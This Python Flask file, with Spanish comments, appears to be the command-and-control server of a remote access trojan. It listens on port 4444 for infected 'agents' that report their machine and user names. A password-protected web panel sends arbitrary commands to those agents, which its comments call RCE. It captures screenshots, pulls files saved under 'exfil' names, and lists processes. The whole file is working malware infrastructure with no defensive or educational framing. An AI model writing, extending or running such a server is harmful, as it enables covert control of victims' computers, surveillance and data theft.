from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_from_directory
import socket
import threading
import os
from functools import wraps

app = Flask(__name__)

# --- CONFIGURACIÓN DE SEGURIDAD ---
app.secret_key = 'clave_maestra_super_secreta_2026' 
USER_ADMIN = "admin"
PASS_ADMIN = "pwned2026"

agentes = {}

# --- DECORADOR: LOGIN REQUERIDO ---
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

# --- SERVIDOR DE RED (SOCKETS) ---
def escuchar_agentes():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Evita error de puerto ocupado
    server.bind(("0.0.0.0", 4444))
    server.listen(10)
    print("[*] Servidor de Red: Esperando agentes en el puerto 4444...")
    
    while True:
        try:
            conn, addr = server.accept()
            identidad = conn.recv(1024).decode('cp850', errors='replace')
            
            if "|" in identidad:
                pc_name, user_name = identidad.split("|")
            else:
                pc_name, user_name = "Desconocido", "Desconocido"

            id_agente = len(agentes)
            agentes[id_agente] = {
                "socket": conn, 
                "addr": addr, 
                "pc": pc_name,
                "user": user_name,
                "res": "Agente conectado. Listo para operar."
            }
            print(f"[+] NUEVO AGENTE: {pc_name}\\{user_name} desde {addr[0]}")
            
        except Exception as e:
            print(f"[-] Error en red: {e}")

# --- RUTAS DE AUTENTICACIÓN ---
@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        if request.form['username'] != USER_ADMIN or request.form['password'] != PASS_ADMIN:
            error = 'Acceso denegado.'
        else:
            session['logged_in'] = True
            return redirect(url_for('index'))
    return render_template('login.html', error=error)

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

# --- RUTAS PRINCIPALES ---
@app.route('/')
@login_required
def index():
    return render_template('index.html')

@app.route('/screenshots/<path:filename>')
@login_required
def get_screenshot(filename):
    # Nota: El HTML espera las imágenes de esta ruta
    return send_from_directory('downloads', filename)

@app.route('/ejecutar', methods=['POST'])
@login_required
def ejecutar():
    try:
        id_target = int(request.form.get('id'))
        comando = request.form.get('comando')
        
        if id_target in agentes:
            conn = agentes[id_target]["socket"]
            conn.send(comando.encode())
            
            # --- RECEPCIÓN DE DATOS ---
            # Aumentamos el buffer a 1MB para listas de procesos largas
            respuesta_raw = conn.recv(1024 * 1024) 
            
            # 1. TRATAMIENTO DE ARCHIVOS (Screenshots/Descargas)
            if respuesta_raw.startswith(b"FILE_SIZE:"):
                header_full = respuesta_raw.decode('ascii', errors='ignore')
                header_parts = header_full.split(":", 1)
                
                size_str = ""
                for char in header_parts[1]:
                    if char.isdigit(): size_str += char
                    else: break
                
                size = int(size_str)
                header_len = 10 + len(size_str) 
                datos_acumulados = respuesta_raw[header_len:] 
                
                if not os.path.exists('downloads'):
                    os.makedirs('downloads')
                
                nombre_archivo = f"screen_{id_target}.jpg" if comando == "screenshot" else f"exfil_{id_target}.bin"
                ruta_final = os.path.join('downloads', nombre_archivo)
                
                while len(datos_acumulados) < size:
                    chunk = conn.recv(4096)
                    if not chunk: break
                    datos_acumulados += chunk
                
                datos_acumulados = datos_acumulados[:size]
                with open(ruta_final, "wb") as f:
                    f.write(datos_acumulados)
                
                res_final = f"ÉXITO: {nombre_archivo} recibido correctamente."

            # 2. TRATAMIENTO DE SYSTEM TOOLS (Lista de procesos)
            elif b"--- PROCESOS ---" in respuesta_raw:
                respuesta_decodificada = respuesta_raw.decode('cp850', errors='replace')
                # Limpiamos el formato "PID:Nombre|" para que el HTML lo vea en líneas
                res_final = respuesta_decodificada.replace("--- PROCESOS ---\n", "").replace("|", "\n")

            # 3. TRATAMIENTO DE COMANDOS NORMALES (RCE)
            else:
                res_final = respuesta_raw.decode('cp850', errors='replace')

            agentes[id_target]["res"] = res_final
            return jsonify({"status": "success", "resultado": res_final})
        else:
            return jsonify({"status": "error", "resultado": "Agente no encontrado"})
    except Exception as e:
        print(f"Error en ejecutar: {e}")
        return jsonify({"status": "error", "resultado": str(e)})

@app.route('/api/agentes')
@login_required
def api_agentes():
    datos = []
    for id_agente, info in agentes.items():
        datos.append({
            "id": id_agente,
            "ip": info["addr"][0],
            "pc": info.get("pc", "N/A"),
            "user": info.get("user", "N/A"),
            "resultado": info["res"]
        })
    return jsonify(datos)

if __name__ == '__main__':
    # Creamos la carpeta de descargas si no existe
    if not os.path.exists('downloads'):
        os.makedirs('downloads')
        
    threading.Thread(target=escuchar_agentes, daemon=True).start()
    # Cambiado a puerto 5000 como tenías en tu última versión
    app.run(host='0.0.0.0', port=5000, debug=False)
